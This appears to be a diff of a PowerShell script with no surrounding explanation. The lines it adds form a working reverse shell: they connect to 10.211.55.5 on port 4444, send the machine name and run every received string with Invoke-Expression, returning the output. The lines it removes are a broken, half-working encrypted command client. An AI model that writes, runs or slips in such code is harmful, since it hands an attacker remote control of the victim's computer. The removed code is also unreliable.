@@ -1,43 +1,19 @@
 
+$c = '10.211.55.5'; $p = 4444;
+$client = New-Object System.Net.Sockets.TCPClient($c, $p);
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$buffer = New-Object byte[] 1024;
+$encoding = New-Object System.Text.ASCIIEncoding;
 
-Add-Type -AssemblyName System.Security.Cryptography
-
-$X = 0x55 ^ 0xAA
-$IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
-$P = 443
-
-
-$TcpClient = New-Object System.Net.Sockets.TcpClient
-$TcpClient.Connect($IP, $P)
-$Stream = $TcpClient.GetStream()
-$Writer = New-Object System.IO.BinaryWriter($Stream)
-$Reader = New-Object System.IO.StreamReader($Stream)
-
-
-$Key = New-Object byte[] 32
-$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-$rng.GetBytes($Key)
-
-
-$aes = New-Object System.Security.Cryptography.AesManaged
-$aes.Key = $Key
-$aes.GenerateIV()
-$IV = $aes.IV
-$Stream.Write($IV, 0, $IV.Length)
-
-
-While ($true) {
-    Try {
-        $CMD = $Reader.ReadLine()
-        If ($CMD -eq "exit") { break }
-        $encryptedCMD = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($CMD), 0, $CMD.Length)
-        $Stream.Write($encryptedCMD, 0, $encryptedCMD.Length)
-        $encryptedResp = New-Object byte[] 4096
-        $bytesRead = $Stream.Read($encryptedResp, 0, $encryptedResp.Length)
-        $decryptedResp = $aes.CreateDecryptor().TransformFinalBlock($encryptedResp, 0, $bytesRead)
-        Write-Host [Text.Encoding]::ASCII.GetString($decryptedResp)
-    } catch {
-        $TcpClient.Close()
-        $Stream.Close()
+$writer.WriteLine("Connection Established: " + [System.Environment]::MachineName);
+$writer.Flush();
+While($client.Connected) {
+    $stream.Read($buffer, 0, $buffer.Length) | Out-Null;
+    $data = $encoding.GetString($buffer);
+If($data.Trim() -ne "") {
+        $output = Invoke-Expression $data 2>&1 | Out-String;
+        $writer.WriteLine($output);
+        $writer.Flush();
     }
 }
